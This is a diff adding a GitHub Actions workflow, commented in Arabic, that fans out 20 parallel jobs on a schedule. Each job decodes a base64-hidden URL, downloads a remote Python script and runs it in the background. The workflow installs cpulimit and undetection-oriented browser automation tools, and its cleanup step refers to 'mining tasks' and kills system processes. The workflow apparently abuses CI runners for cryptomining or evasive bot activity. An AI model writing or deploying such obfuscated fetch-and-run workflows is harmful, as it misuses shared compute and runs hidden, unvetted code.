@@ -1,1 +1,119 @@
+name: Linux Swarm Execution Division
 
+on:
+  schedule:
+    # يعمل تلقائياً في الأوقات: 00:00، 08:00، 16:00 (بتوقيت UTC)
+    - cron: '0 0,8,16 * * *'
+
+concurrency:
+  group: swarm-division-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # مهمة المشرف العام: تراقب الوقت وتُنهي الـ workflow بالكامل بعد ساعة
+  # =================================================================
+  global-supervisor:
+    name: "Global Time Enforcer"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+    steps:
+      - name: Enforce One-Hour Global Limit
+        run: |
+          echo "[ENFORCER] Global watchdog engaged. All jobs will be terminated after 60 minutes."
+          echo "[ENFORCER] Current run ID: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 60 دقيقة (3600 ثانية)
+          sleep 3600
+          
+          echo "[ENFORCER] One-hour limit reached! Requesting full workflow cancellation..."
+          
+          # إرسال طلب إلغاء الـ workflow بالكامل
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[ENFORCER] Cancellation request dispatched successfully."
+
+  # =================================================================
+  # المهمة الرئيسية: تشغيل الوحدات
+  # =================================================================
+  initiate-units:
+    name: "Division-${{ matrix.division_no }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+
+    strategy:
+      fail-fast: false
+      matrix:
+        division_no: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+      # ☆ المرحلة الأولى: تجهيز البنية الأساسية
+      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+      - name: Raise Foundation Layer
+        run: |
+          echo "[FOUNDATION] Erecting Division-${{ matrix.division_no }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y cpulimit curl python3-pip
+
+      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+      # ☆ المرحلة الثانية: استدعاء البرنامج التنفيذي
+      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+      - name: Summon Runtime Binary
+        run: |
+          echo "[SUMMON] Retrieving app_task.py from data vault..."
+          DATA_VAULT=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$DATA_VAULT" -o app_task.py
+          echo "[SUMMON] Runtime binary cached locally."
+
+      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+      # ☆ المرحلة الثالثة: تجهيز متطلبات بايثون
+      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+      - name: Bind Python Requirements
+        run: |
+          echo "[BIND] Binding Python dependencies to runtime..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+      # ☆ المرحلة الرابعة: التنفيذ تحت إشراف مؤقت
+      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+      - name: Engage Task with Time Custodian
+        run: |
+          echo ">> Engaging workload for Division-${{ matrix.division_no }}..."
+          
+          # إطلاق السكربت في الخلفية
+          python3 app_task.py &
+          DIVISION_PID=$!
+          
+          echo ">> Time custodian monitoring. Ceiling: 74 minutes."
+          
+          # الانتظار حتى استهلاك المدة المسموحة
+          sleep 4440
+          
+          # إنهاء العملية إن كانت لا تزال نشطة
+          if kill -0 $DIVISION_PID 2>/dev/null; then
+            echo ">> Ceiling surpassed! Aborting workload..."
+            kill -9 $DIVISION_PID
+            echo ">> Workload aborted by custodian."
+          else
+            echo ">> Workload completed within the ceiling."
+          fi
+
+      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+      # ☆ المرحلة الخامسة: التنظيف وإغلاق الوحدة
+      # ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+      - name: Wipe and Stand Down
+        run: |
+          echo "[STANDDOWN] Division-${{ matrix.division_no }} preparing to stand down."
+          echo "[STANDDOWN] Wiping leftover cpulimit and mining tasks..."
+          sudo pkill -f cpulimit || true
+          sudo pkill -f systemd-logind || true
+          echo "[STANDDOWN] Division-${{ matrix.division_no }} stood down cleanly."
